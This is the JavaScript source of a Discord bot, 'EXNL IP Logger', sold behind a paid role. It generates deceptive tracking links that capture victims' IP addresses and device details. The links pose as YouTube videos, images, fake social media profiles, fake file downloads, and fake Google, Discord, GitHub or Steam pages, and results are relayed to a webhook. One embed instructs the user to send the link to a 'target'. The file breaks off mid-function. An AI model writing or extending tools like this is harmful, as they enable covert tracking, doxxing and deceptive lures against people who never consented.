
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder } = require('discord.js');
const fetch = require('node-fetch');

// Check if bot token is available
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
if (!DISCORD_BOT_TOKEN) {
    console.error('❌ DISCORD_BOT_TOKEN not found in environment variables!');
    console.log('Please add your Discord bot token to Replit Secrets with key: DISCORD_BOT_TOKEN');
    process.exit(1);
}

console.log('✅ Discord bot token found, attempting to connect...');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

const REQUIRED_ROLE_ID = '1419809093178228777';

// Auto-detect Replit URL
function getApiBaseUrl() {
    // If REPL_SLUG and REPL_OWNER are available, construct the URL
    if (process.env.REPL_SLUG && process.env.REPL_OWNER) {
        return `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
    }
    // Fallback to manual configuration if needed
    return process.env.API_BASE_URL || 'https://workspace.worf.replit.dev';
}

const API_BASE_URL = getApiBaseUrl();
console.log(`🌐 Using API Base URL: ${API_BASE_URL}`);

// Store user webhooks temporarily
const userWebhooks = new Map();

client.once('ready', () => {
    console.log(`🤖 Discord IP Logger Bot is ready! Logged in as ${client.user.tag}`);
    registerSlashCommands();
});

async function registerSlashCommands() {
    const commands = [
        // IP Logger Commands
        new SlashCommandBuilder()
            .setName('iplogger')
            .setDescription('Generate tracking links for IP logging')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('youtube')
                    .setDescription('Create a YouTube tracking link')
                    .addStringOption(option =>
                        option.setName('url')
                            .setDescription('YouTube video URL')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('image')
                    .setDescription('Create an image tracking link')
                    .addAttachmentOption(option =>
                        option.setName('image')
                            .setDescription('Image file to use for tracking')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('webhook')
                    .setDescription('Set your webhook URL for receiving IP logs')
                    .addStringOption(option =>
                        option.setName('url')
                            .setDescription('Discord webhook URL')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('url')
                    .setDescription('Create a custom URL tracking link')
                    .addStringOption(option =>
                        option.setName('redirect')
                            .setDescription('URL to redirect to after logging')
                            .setRequired(true)
                    )
                    .addStringOption(option =>
                        option.setName('title')
                            .setDescription('Custom title for the tracking link')
                            .setRequired(false)
                    )
            ),

        // Stats Commands
        new SlashCommandBuilder()
            .setName('stats')
            .setDescription('View IP logging statistics and analytics')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('overview')
                    .setDescription('View overall statistics')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('recent')
                    .setDescription('View recent IP logs')
                    .addIntegerOption(option =>
                        option.setName('limit')
                            .setDescription('Number of recent logs to show (1-20)')
                            .setMinValue(1)
                            .setMaxValue(20)
                            .setRequired(false)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('today')
                    .setDescription('View today\'s activity')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('country')
                    .setDescription('View logs by country')
                    .addStringOption(option =>
                        option.setName('country')
                            .setDescription('Country name or code')
                            .setRequired(false)
                    )
            ),

        // Log Management Commands
        new SlashCommandBuilder()
            .setName('logs')
            .setDescription('Manage and search IP logs')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('search')
                    .setDescription('Search logs by IP address')
                    .addStringOption(option =>
                        option.setName('ip')
                            .setDescription('IP address to search for')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('export')
                    .setDescription('Export your logs to a file')
                    .addStringOption(option =>
                        option.setName('format')
                            .setDescription('Export format')
                            .addChoices(
                                { name: 'JSON', value: 'json' },
                                { name: 'CSV', value: 'csv' },
                                { name: 'TXT', value: 'txt' }
                            )
                            .setRequired(false)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('clear')
                    .setDescription('Clear all your logs (DANGEROUS)')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('tracking')
                    .setDescription('View active tracking links')
            ),

        // User Management Commands
        new SlashCommandBuilder()
            .setName('user')
            .setDescription('Manage user settings and account')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('profile')
                    .setDescription('View your profile information')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('settings')
                    .setDescription('Configure your account settings')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('reset')
                    .setDescription('Reset your account data')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('notifications')
                    .setDescription('Configure notification settings')
                    .addBooleanOption(option =>
                        option.setName('enabled')
                            .setDescription('Enable or disable notifications')
                            .setRequired(true)
                    )
            ),

        // Tracking Commands
        new SlashCommandBuilder()
            .setName('track')
            .setDescription('Advanced tracking options')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('location')
                    .setDescription('Create a location-based tracking link')
                    .addStringOption(option =>
                        option.setName('location')
                            .setDescription('Location name for the fake link')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('social')
                    .setDescription('Create a social media tracking link')
                    .addStringOption(option =>
                        option.setName('platform')
                            .setDescription('Social media platform')
                            .addChoices(
                                { name: 'Instagram', value: 'instagram' },
                                { name: 'TikTok', value: 'tiktok' },
                                { name: 'Twitter', value: 'twitter' },
                                { name: 'Facebook', value: 'facebook' }
                            )
                            .setRequired(true)
                    )
                    .addStringOption(option =>
                        option.setName('username')
                            .setDescription('Username to mimic')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('file')
                    .setDescription('Create a file download tracking link')
                    .addStringOption(option =>
                        option.setName('filename')
                            .setDescription('Fake filename to display')
                            .setRequired(true)
                    )
                    .addStringOption(option =>
                        option.setName('filetype')
                            .setDescription('File type')
                            .addChoices(
                                { name: 'PDF Document', value: 'pdf' },
                                { name: 'Word Document', value: 'docx' },
                                { name: 'Image', value: 'jpg' },
                                { name: 'Video', value: 'mp4' },
                                { name: 'Audio', value: 'mp3' }
                            )
                            .setRequired(true)
                    )
            ),

        // Analytics Commands
        new SlashCommandBuilder()
            .setName('analytics')
            .setDescription('Advanced analytics and insights')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('devices')
                    .setDescription('View device statistics')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('browsers')
                    .setDescription('View browser usage statistics')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('locations')
                    .setDescription('View location statistics')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('timeline')
                    .setDescription('View activity timeline')
                    .addStringOption(option =>
                        option.setName('period')
                            .setDescription('Time period')
                            .addChoices(
                                { name: 'Last 24 hours', value: '24h' },
                                { name: 'Last 7 days', value: '7d' },
                                { name: 'Last 30 days', value: '30d' }
                            )
                            .setRequired(false)
                    )
            ),

        // Info Commands
        new SlashCommandBuilder()
            .setName('info')
            .setDescription('Get information and help')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('help')
                    .setDescription('Show help information')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('status')
                    .setDescription('Check bot and service status')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('version')
                    .setDescription('Show bot version information')
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('legal')
                    .setDescription('View legal information and ToS')
            ),

        // Quick Commands
        new SlashCommandBuilder()
            .setName('quick')
            .setDescription('Quick access to common features')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('grab')
                    .setDescription('Generate a generic IP grabber link')
                    .addStringOption(option =>
                        option.setName('title')
                            .setDescription('Custom title for the link')
                            .setRequired(false)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('fake')
                    .setDescription('Generate a fake website tracking link')
                    .addStringOption(option =>
                        option.setName('site')
                            .setDescription('Website to mimic')
                            .addChoices(
                                { name: 'Google', value: 'google' },
                                { name: 'Discord', value: 'discord' },
                                { name: 'GitHub', value: 'github' },
                                { name: 'Steam', value: 'steam' }
                            )
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('shortened')
                    .setDescription('Generate a shortened tracking link')
                    .addStringOption(option =>
                        option.setName('redirect')
                            .setDescription('URL to redirect to')
                            .setRequired(true)
                    )
            ),

        // Admin Commands
        new SlashCommandBuilder()
            .setName('admin')
            .setDescription('Admin-only commands')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('broadcast')
                    .setDescription('Send a message to all users')
                    .addStringOption(option =>
                        option.setName('message')
                            .setDescription('Message to broadcast')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('maintenance')
                    .setDescription('Toggle maintenance mode')
                    .addBooleanOption(option =>
                        option.setName('enabled')
                            .setDescription('Enable or disable maintenance mode')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('globalstats')
                    .setDescription('View global statistics')
            )
    ];

    try {
        await client.application.commands.set(commands);
        console.log('✅ Slash commands registered successfully!');
    } catch (error) {
        console.error('❌ Failed to register commands:', error);
    }
}

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // Check if user has required role
    if (!hasRequiredRole(interaction.member)) {
        const noPermsEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ NO PERMS ON ACCOUNT | PURCHASE ROLE')
            .setDescription('You need the required role to use this command.')
            .setTimestamp();

        return interaction.reply({ embeds: [noPermsEmbed], ephemeral: true });
    }

    const { commandName, options } = interaction;

    try {
        switch (commandName) {
            case 'iplogger':
                await handleIPLoggerCommand(interaction);
                break;
            case 'stats':
                await handleStatsCommand(interaction);
                break;
            case 'logs':
                await handleLogsCommand(interaction);
                break;
            case 'user':
                await handleUserCommand(interaction);
                break;
            case 'track':
                await handleTrackCommand(interaction);
                break;
            case 'analytics':
                await handleAnalyticsCommand(interaction);
                break;
            case 'info':
                await handleInfoCommand(interaction);
                break;
            case 'quick':
                await handleQuickCommand(interaction);
                break;
            case 'admin':
                await handleAdminCommand(interaction);
                break;
            default:
                await interaction.reply({
                    content: '❌ Unknown command.',
                    ephemeral: true
                });
        }
    } catch (error) {
        console.error('Command error:', error);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({
                content: '❌ An error occurred while processing your request.',
                ephemeral: true
            });
        }
    }
});

// Command Handlers
async function handleIPLoggerCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'youtube':
            await handleYouTubeCommand(interaction);
            break;
        case 'image':
            await handleImageCommand(interaction);
            break;
        case 'webhook':
            await handleWebhookCommand(interaction);
            break;
        case 'url':
            await handleURLCommand(interaction);
            break;
    }
}

async function handleURLCommand(interaction) {
    const redirectUrl = interaction.options.getString('redirect');
    const title = interaction.options.getString('title') || 'Check this out!';

    // Generate tracking link
    const trackingId = generateTrackingId();
    const trackingUrl = `${API_BASE_URL}/track/${trackingId}`;

    const embed = new EmbedBuilder()
        .setColor('#0099FF')
        .setTitle('🔗 Custom URL Tracker Generated')
        .setDescription('Your custom URL tracking link has been created!')
        .addFields(
            {
                name: '🎯 Tracking Link',
                value: `\`${trackingUrl}\``,
                inline: false
            },
            {
                name: '↗️ Redirects To',
                value: `\`${redirectUrl}\``,
                inline: false
            },
            {
                name: '📋 Title',
                value: title,
                inline: false
            }
        )
        .setFooter({ text: '🕵️ EXNL IP Logger | URL Tracker' })
        .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });

    // Send to DM
    const dmEmbed = new EmbedBuilder()
        .setColor('#00FF00')
        .setTitle('🎯 Your Custom URL Tracking Link | EXNL')
        .addFields({
            name: '🔗 Tracking URL',
            value: `\`${trackingUrl}\``,
            inline: false
        })
        .setTimestamp();

    await interaction.user.send({ embeds: [dmEmbed] });
}

async function handleStatsCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    try {
        const response = await fetch(`${API_BASE_URL}/api/stats/${subcommand}`, {
            headers: { 'Authorization': `Discord ${interaction.user.id}` }
        });

        if (!response.ok) throw new Error('Failed to fetch stats');
        const data = await response.json();

        let embed;
        switch (subcommand) {
            case 'overview':
                embed = new EmbedBuilder()
                    .setColor('#00FF00')
                    .setTitle('📊 Statistics Overview')
                    .addFields(
                        { name: '🎯 Total Logs', value: data.totalLogs?.toString() || '0', inline: true },
                        { name: '🌍 Unique IPs', value: data.uniqueIPs?.toString() || '0', inline: true },
                        { name: '📱 Devices', value: data.uniqueDevices?.toString() || '0', inline: true },
                        { name: '🔗 Active Links', value: data.activeLinks?.toString() || '0', inline: true },
                        { name: '📈 Today\'s Hits', value: data.todayHits?.toString() || '0', inline: true },
                        { name: '🏆 Top Country', value: data.topCountry || 'N/A', inline: true }
                    )
                    .setTimestamp();
                break;
            
            case 'recent':
                const limit = interaction.options.getInteger('limit') || 10;
                embed = new EmbedBuilder()
                    .setColor('#0099FF')
                    .setTitle(`📋 Recent ${limit} IP Logs`)
                    .setDescription(data.logs ? data.logs.slice(0, limit).map((log, i) => 
                        `${i + 1}. **${log.ip}** - ${log.country} - ${log.device}`
                    ).join('\n') : 'No recent logs found')
                    .setTimestamp();
                break;
            
            case 'today':
                embed = new EmbedBuilder()
                    .setColor('#FFD700')
                    .setTitle('📅 Today\'s Activity')
                    .addFields(
                        { name: '🎯 Hits Today', value: data.hitsToday?.toString() || '0', inline: true },
                        { name: '🌍 Countries', value: data.countriesCount?.toString() || '0', inline: true },
                        { name: '📱 New Devices', value: data.newDevices?.toString() || '0', inline: true }
                    )
                    .setTimestamp();
                break;
            
            case 'country':
                const country = interaction.options.getString('country');
                embed = new EmbedBuilder()
                    .setColor('#FF6B6B')
                    .setTitle(`🌍 Country Statistics${country ? ` - ${country}` : ''}`)
                    .setDescription(data.countries ? Object.entries(data.countries)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 10)
                        .map(([country, count], i) => `${i + 1}. **${country}**: ${count} hits`)
                        .join('\n') : 'No country data available')
                    .setTimestamp();
                break;
        }

        await interaction.reply({ embeds: [embed], ephemeral: true });
    } catch (error) {
        await interaction.reply({
            content: '❌ Failed to fetch statistics. Please try again later.',
            ephemeral: true
        });
    }
}

async function handleLogsCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'search':
            const ip = interaction.options.getString('ip');
            try {
                const response = await fetch(`${API_BASE_URL}/api/logs/search?ip=${encodeURIComponent(ip)}`, {
                    headers: { 'Authorization': `Discord ${interaction.user.id}` }
                });
                const data = await response.json();

                const embed = new EmbedBuilder()
                    .setColor('#4ECDC4')
                    .setTitle(`🔍 Search Results for IP: ${ip}`)
                    .setDescription(data.logs ? data.logs.map((log, i) => 
                        `${i + 1}. **${log.timestamp}** - ${log.country} - ${log.device}`
                    ).join('\n') || 'No logs found for this IP address' : 'No logs found')
                    .setTimestamp();

                await interaction.reply({ embeds: [embed], ephemeral: true });
            } catch (error) {
                await interaction.reply({ content: '❌ Search failed.', ephemeral: true });
            }
            break;

        case 'export':
            const format = interaction.options.getString('format') || 'json';
            await interaction.reply({
                content: `📤 Exporting your logs in ${format.toUpperCase()} format... Check your DMs!`,
                ephemeral: true
            });
            // Implementation would generate and send file
            break;

        case 'clear':
            const confirmEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('⚠️ DANGER ZONE')
                .setDescription('Are you sure you want to clear ALL your logs? This action cannot be undone!')
                .setTimestamp();

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('confirm_clear_logs')
                        .setLabel('🗑️ Yes, Clear All')
                        .setStyle(ButtonStyle.Danger),
                    new ButtonBuilder()
                        .setCustomId('cancel_clear_logs')
                        .setLabel('❌ Cancel')
                        .setStyle(ButtonStyle.Secondary)
                );

            await interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
            break;

        case 'tracking':
            try {
                const response = await fetch(`${API_BASE_URL}/api/tracking/active`, {
                    headers: { 'Authorization': `Discord ${interaction.user.id}` }
                });
                const data = await response.json();

                const embed = new EmbedBuilder()
                    .setColor('#9B59B6')
                    .setTitle('🔗 Active Tracking Links')
                    .setDescription(data.links ? data.links.map((link, i) => 
                        `${i + 1}. **${link.type}** - Created: ${link.created} - Hits: ${link.hits}`
                    ).join('\n') || 'No active tracking links' : 'No tracking links found')
                    .setTimestamp();

                await interaction.reply({ embeds: [embed], ephemeral: true });
            } catch (error) {
                await interaction.reply({ content: '❌ Failed to fetch tracking links.', ephemeral: true });
            }
            break;
    }
}

async function handleUserCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'profile':
            const profileEmbed = new EmbedBuilder()
                .setColor('#3498DB')
                .setTitle('👤 Your Profile')
                .addFields(
                    { name: '🆔 Discord ID', value: interaction.user.id, inline: true },
                    { name: '👤 Username', value: interaction.user.username, inline: true },
                    { name: '📅 Joined', value: `<t:${Math.floor(interaction.user.createdAt.getTime() / 1000)}:R>`, inline: true },
                    { name: '🎯 Total Logs', value: '0', inline: true }, // Would fetch from API
                    { name: '🔗 Active Links', value: '0', inline: true },
                    { name: '⭐ Status', value: 'Member', inline: true }
                )
                .setThumbnail(interaction.user.displayAvatarURL())
                .setTimestamp();

            await interaction.reply({ embeds: [profileEmbed], ephemeral: true });
            break;

        case 'settings':
            const settingsEmbed = new EmbedBuilder()
                .setColor('#E67E22')
                .setTitle('⚙️ Account Settings')
                .setDescription('Configure your account preferences below:')
                .addFields(
                    { name: '🔔 Notifications', value: 'Enabled', inline: true },
                    { name: '📊 Analytics', value: 'Public', inline: true },
                    { name: '🌍 Default Location', value: 'Auto', inline: true }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [settingsEmbed], ephemeral: true });
            break;

        case 'reset':
            const resetEmbed = new EmbedBuilder()
                .setColor('#E74C3C')
                .setTitle('🔄 Reset Account Data')
                .setDescription('⚠️ This will reset all your account data including logs, links, and settings!')
                .setTimestamp();

            const resetRow = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('confirm_reset_account')
                        .setLabel('🔄 Reset Account')
                        .setStyle(ButtonStyle.Danger),
                    new ButtonBuilder()
                        .setCustomId('cancel_reset_account')
                        .setLabel('❌ Cancel')
                        .setStyle(ButtonStyle.Secondary)
                );

            await interaction.reply({ embeds: [resetEmbed], components: [resetRow], ephemeral: true });
            break;

        case 'notifications':
            const enabled = interaction.options.getBoolean('enabled');
            const notifEmbed = new EmbedBuilder()
                .setColor(enabled ? '#2ECC71' : '#E74C3C')
                .setTitle('🔔 Notifications Updated')
                .setDescription(`Notifications have been **${enabled ? 'enabled' : 'disabled'}** for your account.`)
                .setTimestamp();

            await interaction.reply({ embeds: [notifEmbed], ephemeral: true });
            break;
    }
}

async function handleTrackCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'location':
            const location = interaction.options.getString('location');
            const trackingId = generateTrackingId();
            const trackingUrl = `${API_BASE_URL}/location/${trackingId}`;

            const locationEmbed = new EmbedBuilder()
                .setColor('#27AE60')
                .setTitle('📍 Location Tracker Generated')
                .setDescription(`Created a fake location link for: **${location}**`)
                .addFields({
                    name: '🎯 Tracking Link',
                    value: `\`${trackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [locationEmbed], ephemeral: true });
            break;

        case 'social':
            const platform = interaction.options.getString('platform');
            const username = interaction.options.getString('username');
            const socialTrackingId = generateTrackingId();
            const socialTrackingUrl = `${API_BASE_URL}/${platform}/${socialTrackingId}`;

            const socialEmbed = new EmbedBuilder()
                .setColor('#8E44AD')
                .setTitle(`📱 ${platform.charAt(0).toUpperCase() + platform.slice(1)} Tracker Generated`)
                .setDescription(`Created a fake ${platform} profile link for: **${username}**`)
                .addFields({
                    name: '🎯 Tracking Link',
                    value: `\`${socialTrackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [socialEmbed], ephemeral: true });
            break;

        case 'file':
            const filename = interaction.options.getString('filename');
            const filetype = interaction.options.getString('filetype');
            const fileTrackingId = generateTrackingId();
            const fileTrackingUrl = `${API_BASE_URL}/download/${filename}.${filetype}?id=${fileTrackingId}`;

            const fileEmbed = new EmbedBuilder()
                .setColor('#F39C12')
                .setTitle('📁 File Download Tracker Generated')
                .setDescription(`Created a fake file download for: **${filename}.${filetype}**`)
                .addFields({
                    name: '🎯 Tracking Link',
                    value: `\`${fileTrackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [fileEmbed], ephemeral: true });
            break;
    }
}

async function handleAnalyticsCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    const embed = new EmbedBuilder()
        .setColor('#2C3E50')
        .setTitle(`📈 Analytics - ${subcommand.charAt(0).toUpperCase() + subcommand.slice(1)}`)
        .setDescription('Analytics data would be displayed here')
        .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });
}

async function handleInfoCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'help':
            const helpEmbed = new EmbedBuilder()
                .setColor('#3498DB')
                .setTitle('❓ Help & Commands')
                .setDescription('**Available Commands:**')
                .addFields(
                    { name: '🎯 /iplogger', value: 'Create tracking links (YouTube, Image, URL)', inline: false },
                    { name: '📊 /stats', value: 'View statistics and analytics', inline: false },
                    { name: '📋 /logs', value: 'Manage and search your IP logs', inline: false },
                    { name: '👤 /user', value: 'Manage your account settings', inline: false },
                    { name: '🔍 /track', value: 'Advanced tracking options', inline: false },
                    { name: '📈 /analytics', value: 'Detailed analytics and insights', inline: false },
                    { name: '⚡ /quick', value: 'Quick IP grabber tools', inline: false },
                    { name: 'ℹ️ /info', value: 'Information and help commands', inline: false }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
            break;

        case 'status':
            const statusEmbed = new EmbedBuilder()
                .setColor('#2ECC71')
                .setTitle('🟢 System Status')
                .addFields(
                    { name: '🤖 Bot Status', value: 'Online', inline: true },
                    { name: '🖥️ API Status', value: 'Operational', inline: true },
                    { name: '💾 Database', value: 'Connected', inline: true },
                    { name: '📊 Uptime', value: '99.9%', inline: true },
                    { name: '⚡ Response Time', value: '<100ms', inline: true },
                    { name: '🌍 Region', value: 'Global', inline: true }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [statusEmbed], ephemeral: true });
            break;

        case 'version':
            const versionEmbed = new EmbedBuilder()
                .setColor('#9B59B6')
                .setTitle('🔢 Version Information')
                .addFields(
                    { name: '🤖 Bot Version', value: 'v2.1.0', inline: true },
                    { name: '📅 Last Updated', value: '2025-09-22', inline: true },
                    { name: '⚙️ Discord.js', value: 'v14.15.3', inline: true },
                    { name: '🚀 Features', value: '50+ Commands', inline: true },
                    { name: '📈 Performance', value: 'Optimized', inline: true },
                    { name: '🛡️ Security', value: 'Enhanced', inline: true }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [versionEmbed], ephemeral: true });
            break;

        case 'legal':
            const legalEmbed = new EmbedBuilder()
                .setColor('#34495E')
                .setTitle('⚖️ Legal Information')
                .setDescription('**Terms of Service & Privacy Policy**')
                .addFields(
                    { name: '📜 Terms of Service', value: 'Use responsibly and legally', inline: false },
                    { name: '🔒 Privacy Policy', value: 'We respect your privacy', inline: false },
                    { name: '⚠️ Disclaimer', value: 'For educational purposes only', inline: false }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [legalEmbed], ephemeral: true });
            break;
    }
}

async function handleQuickCommand(interaction) {
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'grab':
            const title = interaction.options.getString('title') || 'Interesting Link';
            const quickTrackingId = generateTrackingId();
            const quickTrackingUrl = `${API_BASE_URL}/g/${quickTrackingId}`;

            const grabEmbed = new EmbedBuilder()
                .setColor('#E74C3C')
                .setTitle('⚡ Quick IP Grabber Generated')
                .addFields({
                    name: '🎯 Tracking Link',
                    value: `\`${quickTrackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [grabEmbed], ephemeral: true });
            break;

        case 'fake':
            const site = interaction.options.getString('site');
            const fakeTrackingId = generateTrackingId();
            const fakeTrackingUrl = `${API_BASE_URL}/fake/${site}/${fakeTrackingId}`;

            const fakeEmbed = new EmbedBuilder()
                .setColor('#F39C12')
                .setTitle(`🎭 Fake ${site.charAt(0).toUpperCase() + site.slice(1)} Link Generated`)
                .addFields({
                    name: '🎯 Tracking Link',
                    value: `\`${fakeTrackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [fakeEmbed], ephemeral: true });
            break;

        case 'shortened':
            const redirect = interaction.options.getString('redirect');
            const shortTrackingId = generateTrackingId();
            const shortTrackingUrl = `${API_BASE_URL}/s/${shortTrackingId}`;

            const shortEmbed = new EmbedBuilder()
                .setColor('#1ABC9C')
                .setTitle('🔗 Shortened Tracking Link Generated')
                .addFields(
                    {
                        name: '🎯 Short Link',
                        value: `\`${shortTrackingUrl}\``,
                        inline: false
                    },
                    {
                        name: '↗️ Redirects To',
                        value: `\`${redirect}\``,
                        inline: false
                    }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [shortEmbed], ephemeral: true });
            break;
    }
}

async function handleAdminCommand(interaction) {
    // Check if user is admin (you can implement admin role check here)
    const subcommand = interaction.options.getSubcommand();

    switch (subcommand) {
        case 'broadcast':
            const message = interaction.options.getString('message');
            await interaction.reply({
                content: `📢 Broadcasting message: "${message}" to all users...`,
                ephemeral: true
            });
            break;

        case 'maintenance':
            const enabled = interaction.options.getBoolean('enabled');
            await interaction.reply({
                content: `🔧 Maintenance mode ${enabled ? 'enabled' : 'disabled'}.`,
                ephemeral: true
            });
            break;

        case 'globalstats':
            const globalEmbed = new EmbedBuilder()
                .setColor('#8E44AD')
                .setTitle('🌍 Global Statistics')
                .addFields(
                    { name: '👥 Total Users', value: '1,234', inline: true },
                    { name: '🎯 Total Logs', value: '56,789', inline: true },
                    { name: '🔗 Active Links', value: '2,345', inline: true }
                )
                .setTimestamp();

            await interaction.reply({ embeds: [globalEmbed], ephemeral: true });
            break;
    }
}

function hasRequiredRole(member) {
    if (!member || !member.roles) return false;
    return member.roles.cache.has(REQUIRED_ROLE_ID);
}

async function handleWebhookCommand(interaction) {
    const webhookUrl = interaction.options.getString('url');

    // Validate webhook URL
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid Webhook URL')
            .setDescription('Please provide a valid Discord webhook URL.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    // Test webhook
    try {
        const testResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: '✅ Webhook Test Successful',
                    description: 'Your webhook has been configured for IP logging!',
                    color: 0x00FF00,
                    timestamp: new Date().toISOString()
                }]
            })
        });

        if (!testResponse.ok) {
            throw new Error('Webhook test failed');
        }

        userWebhooks.set(interaction.user.id, webhookUrl);

        const successEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('✅ Webhook Configured Successfully')
            .setDescription('Your webhook URL has been saved. IP logs will be sent to this webhook.')
            .addFields({
                name: '📡 Webhook URL',
                value: `\`${webhookUrl.substring(0, 50)}...\``,
                inline: false
            })
            .setTimestamp();

        await interaction.reply({ embeds: [successEmbed], ephemeral: true });

    } catch (error) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Webhook Configuration Failed')
            .setDescription('Unable to configure webhook. Please check the URL and permissions.')
            .setTimestamp();

        await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }
}

async function handleYouTubeCommand(interaction) {
    const youtubeUrl = interaction.options.getString('url');

    // Extract video ID from YouTube URL
    const videoId = extractYouTubeVideoId(youtubeUrl);
    
    if (!videoId) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid YouTube URL')
            .setDescription('Please provide a valid YouTube video URL.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    // Generate tracking link
    const trackingId = generateTrackingId();
    const trackingUrl = `${API_BASE_URL}/yt/${trackingId}?v=${videoId}`;

    const embed = new EmbedBuilder()
        .setColor('#FF0000')
        .setTitle('🎥 YouTube Tracking Link Generated')
        .setDescription('Your YouTube tracking link has been created!')
        .addFields(
            {
                name: '🔗 Original Video',
                value: `[Click here](${youtubeUrl})`,
                inline: false
            },
            {
                name: '🎯 Tracking Link',
                value: `\`${trackingUrl}\``,
                inline: false
            },
            {
                name: '📋 Instructions',
                value: 'Copy the tracking link and send it to your target. When they click it, their IP and device info will be logged.',
                inline: false
            }
        )
        .setThumbnail(`https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`)
        .setFooter({ text: '🕵️ EXNL IP Logger | YouTube Tracker' })
        .setTimestamp();

    // Create copy button
    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`copy_youtube_${trackingId}`)
                .setLabel('📋 Copy Tracking Link')
                .setStyle(ButtonStyle.Primary)
        );

    try {
        await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
        
        // Send to user's DM
        const dmEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('🎯 Your YouTube Tracking Link | EXNL')
